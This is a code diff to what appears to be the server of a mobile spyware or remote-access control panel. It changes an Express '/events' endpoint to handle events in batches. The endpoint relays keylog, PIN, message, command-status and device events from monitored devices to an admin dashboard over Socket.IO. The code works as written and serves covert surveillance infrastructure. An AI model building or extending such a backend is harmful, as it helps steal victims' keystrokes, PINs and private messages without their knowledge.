@@ -77,7 +77,7 @@ router.post('/data', authenticate, asyncHandler(async (req: Request, res: Respon
  * Receive real-time events from external providers (Relay)
  */
 router.post('/events', asyncHandler(async (req: Request, res: Response) => {
-    const { type, data, source, apiKey } = req.body;
+    const { isBatch, events, type, data, source, apiKey } = req.body;
 
     // Security check: API key is REQUIRED
     if (!apiKey || apiKey !== process.env.EXTERNAL_NOTIFY_API_KEY) {
@@ -85,45 +85,52 @@ router.post('/events', asyncHandler(async (req: Request, res: Response) => {
         return res.status(401).json({ success: false, error: 'Unauthorized' });
     }
 
-    logger.debug(`[External Event] Type: ${type}, Source: ${source}, Device: ${data?.device_id}`);
+    const eventsToProcess = isBatch && Array.isArray(events) ? events : [{ type, data, source }];
 
-    // Broadcast to main panel's clients via internal Socket.IO
-    if (type === 'device_change') {
-        const socketPayload = { eventType: 'UPDATE', new: { ...data, app_id: data.app_id } };
-        if (!realtimeRegistry.getSystemConfig()?.highScaleMode) {
-            io.emit('device_change', socketPayload);
-        }
-        if (data.device_id) {
-            io.to(`device-${data.device_id}`).emit('device_change', socketPayload);
-            io.to('admin-dashboard').emit('device_change', socketPayload);
-            if (data.app_id) {
-                io.to(`app-${data.app_id}`).emit('device_change', socketPayload);
+    for (const event of eventsToProcess) {
+        const { type: eType, data: eData } = event;
+
+        logger.debug(`[External Event] Type: ${eType}, Source: ${source}, Device: ${eData?.device_id}`);
+
+        // Broadcast to main panel's clients via internal Socket.IO
+        if (eType === 'device_change') {
+            const socketPayload = { eventType: 'UPDATE', new: { ...eData, app_id: eData.app_id } };
+            if (!realtimeRegistry.getSystemConfig()?.highScaleMode) {
+                io.emit('device_change', socketPayload);
             }
-        }
-    } else if (type === 'message_change') {
-        if (!realtimeRegistry.getSystemConfig()?.highScaleMode) {
-            io.emit('message_change', { eventType: 'INSERT', new: data });
-        }
-        if (data.device_id) {
-            io.to(`messages-${data.device_id}`).emit('message_change', { eventType: 'INSERT', new: data });
-            io.to('admin-messages').emit('message_change', { eventType: 'INSERT', new: data });
-        }
-    } else if (type === 'command_status') {
-        if (data.device_id) {
-            io.to(`device-${data.device_id}`).emit('command_change', { eventType: 'UPDATE', new: data });
-        }
-    } else if (type === 'keylog_change') {
-        if (data.device_id) {
-            io.to(`logs-${data.device_id}`).emit('keylog_change', { eventType: 'INSERT', new: data });
-        }
-    } else if (type === 'pin_change') {
-        if (data.device_id) {
-            io.to(`pins-${data.device_id}`).emit('pin_change', { eventType: 'INSERT', new: data });
+            if (eData.device_id) {
+                io.to(`device-${eData.device_id}`).emit('device_change', socketPayload);
+                io.to('admin-dashboard').emit('device_change', socketPayload);
+                if (eData.app_id) {
+                    io.to(`app-${eData.app_id}`).emit('device_change', socketPayload);
+                }
+            }
+        } else if (eType === 'message_change') {
+            if (!realtimeRegistry.getSystemConfig()?.highScaleMode) {
+                io.emit('message_change', { eventType: 'INSERT', new: eData });
+            }
+            if (eData.device_id) {
+                io.to(`messages-${eData.device_id}`).emit('message_change', { eventType: 'INSERT', new: eData });
+                io.to('admin-messages').emit('message_change', { eventType: 'INSERT', new: eData });
+            }
+        } else if (eType === 'command_status') {
+            if (eData.device_id) {
+                io.to(`device-${eData.device_id}`).emit('command_change', { eventType: 'UPDATE', new: eData });
+            }
+        } else if (eType === 'keylog_change') {
+            if (eData.device_id) {
+                io.to(`logs-${eData.device_id}`).emit('keylog_change', { eventType: 'INSERT', new: eData });
+            }
+        } else if (eType === 'pin_change') {
+            if (eData.device_id) {
+                io.to(`pins-${eData.device_id}`).emit('pin_change', { eventType: 'INSERT', new: eData });
+            }
         }
     }
 
-    return res.json({ success: true });
+    return res.json({ success: true, processed: eventsToProcess.length });
 }));
+
 
 
 export default router;
